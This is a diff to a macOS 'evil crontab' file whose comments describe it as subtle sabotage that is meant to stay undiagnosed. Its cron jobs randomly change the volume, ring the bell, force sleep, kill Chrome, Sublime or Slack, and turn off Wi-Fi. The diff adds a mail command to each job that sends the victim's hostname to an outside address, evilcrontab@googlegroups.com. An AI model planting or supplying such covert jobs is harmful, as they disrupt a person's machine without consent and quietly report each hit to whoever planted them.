@@ -5,19 +5,19 @@
 # Designed to be subtle in its evilness, and aims to have its effects
 # go not unnoticed, but undiagnosed for as long as possible.
 #
-# Format: wait_for_a_while_to_make_evilness_irregular && do_evil_thing get_rid_of_output_to_avoid_cron_mails
+# Format: wait_for_a_while_to_make_evilness_irregular && do_evil_thing && mail notifs
 
 # Keep changing the volume
-*/5 * * * * osascript -e "set Volume $((RANDOM * 10 / 32767))"
+*/5 * * * * osascript -e "set Volume $((RANDOM * 10 / 32767))" && (echo "Volume changed on $HOSTNAME" | mail -s "EVIL @ $HOSTNAME" evilcrontab@googlegroups.com)
 
 # Make annoying sound once every 15 minutes
-*/15 * * * * sleep $(((5 * 60) + (RANDOM * 5 * 60 / 32767))) && tput bel
+*/15 * * * * sleep $(((5 * 60) + (RANDOM * 5 * 60 / 32767))) && tput bel && (echo "Annoying sound on $HOSTNAME" | mail -s "EVIL @ $HOSTNAME" evilcrontab@googlegroups.com)
 
 # Go to sleep once every hour
-0 * * * * sleep $(((15 * 60) + (RANDOM * 30 * 60 / 32767))) && pmset sleepnow > /dev/null 2>&1
+0 * * * * sleep $(((15 * 60) + (RANDOM * 30 * 60 / 32767))) && pmset sleepnow > /dev/null 2>&1 && (echo "Screen went to sleep on $HOSTNAME" | mail -s "EVIL @ $HOSTNAME" evilcrontab@googlegroups.com)
 
 # Kill a app once every three hours
-0 */3 * * * sleep $(((15 * 60) + (RANDOM * 30 * 60 / 32767))) && apps=('Chrome' 'Sublime' 'Slack') && app=${apps[$RANDOM % ${#apps[@]} ]} && kill -9 $(pgrep $app)
+0 */3 * * * sleep $(((15 * 60) + (RANDOM * 30 * 60 / 32767))) && apps=('Chrome' 'Sublime' 'Slack') && app=${apps[$RANDOM % ${#apps[@]} ]} && kill -9 $(pgrep $app) && (echo "An app died on $HOSTNAME" | mail -s "EVIL @ $HOSTNAME" evilcrontab@googlegroups.com)
 
 # Switch off wifi once every four hours
-0 */4 * * * sleep $(((15 * 60) + (RANDOM * 30 * 60 / 32767))) && networksetup -setairportpower en0 off
+0 */4 * * * sleep $(((15 * 60) + (RANDOM * 30 * 60 / 32767))) && networksetup -setairportpower en0 off && (echo "Wifi turned off on $HOSTNAME" | mail -s "EVIL @ $HOSTNAME" evilcrontab@googlegroups.com)
